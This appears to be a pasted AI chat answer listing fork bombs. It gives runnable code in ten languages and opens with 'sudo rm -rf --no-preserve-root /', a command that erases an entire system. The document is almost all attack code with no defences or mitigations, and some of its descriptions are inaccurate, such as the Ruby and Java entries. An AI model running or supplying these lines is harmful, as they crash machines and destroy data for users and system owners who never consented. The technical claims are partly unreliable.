Common linux terminal/bash fork bomb

- :(){ :|:& };:
- sudo rm -rf --no-preserve-root /


### **Types of Fork Bombs**

A **fork bomb** is a type of denial-of-service (DoS) attack that continuously creates new processes, overwhelming system resources and causing a crash. Below are various types of fork bombs across different operating systems and programming languages.

---

### **1. Bash Fork Bomb** (Classic)

```bash
:(){ :|:& };:
```

- Most well-known fork bomb.
- Creates two child processes recursively.

---

### **2. Bash Variant with Comments**

```bash
:(){
  :|:&
}; :
```

- Same as the classic Bash fork bomb but formatted for readability.

---

### **3. Python Fork Bomb**

```python
import os
while True:
    os.fork()
```

- Uses `os.fork()` to create new processes indefinitely.
- Can quickly exhaust system resources.

---

### **4. Perl Fork Bomb**

```perl
fork while fork
```

- Creates child processes infinitely in Perl.

---

### **5. C Fork Bomb**

```c
#include <unistd.h>

int main() {
    while(1) {
        fork();
    }
    return 0;
}
```

- A compiled C program that keeps creating child processes.

---

### **6. Windows Batch Fork Bomb**

```batch
%0|%0
```

- Works in Windows by recursively calling the script itself.

---

### **7. PowerShell Fork Bomb**

```powershell
1..100000 | ForEach-Object {Start-Job -ScriptBlock {param($p) while ($true) { Start-Process powershell -ArgumentList "-NoExit" }} -ArgumentList $_}
```

- Spawns multiple PowerShell processes in an infinite loop.

---

### **8. Ruby Fork Bomb**

```ruby
fork { fork }
```

- Uses the `fork` method in Ruby to create infinite child processes.

---

### **9. PHP Fork Bomb**

```php
<?php
while (true) {
    pcntl_fork();
}
?>
```

- Uses PHP’s `pcntl_fork()` to spawn infinite processes.

---

### **10. Java Fork Bomb**

```java
public class ForkBomb {
    public static void main(String[] args) {
        while (true) {
            new Thread(() -> main(args)).start();
        }
    }
}
```

- Spawns new threads indefinitely, consuming CPU and RAM.

---

### **Databases or Resources on Fork Bombs**

There is **no official central database** that catalogs fork bombs, as they are mostly used for educational or malicious purposes. However, you can find information in:

1. **Wikipedia** – Search for “Fork bomb”
2. **ExploitDB** ([https://www.exploit-db.com/](https://www.exploit-db.com/)) – Some variations of fork bombs may be listed here.
3. **MITRE ATT&CK Framework** ([https://attack.mitre.org/](https://attack.mitre.org/)) – Check process exhaustion techniques.
4. **Security Forums** – Discussions on Stack Overflow, GitHub, and security blogs.
5. **Cybersecurity Books** – “Hacking: The Art of Exploitation” discusses process-based attacks.

Would you like a compiled document of these for future reference?
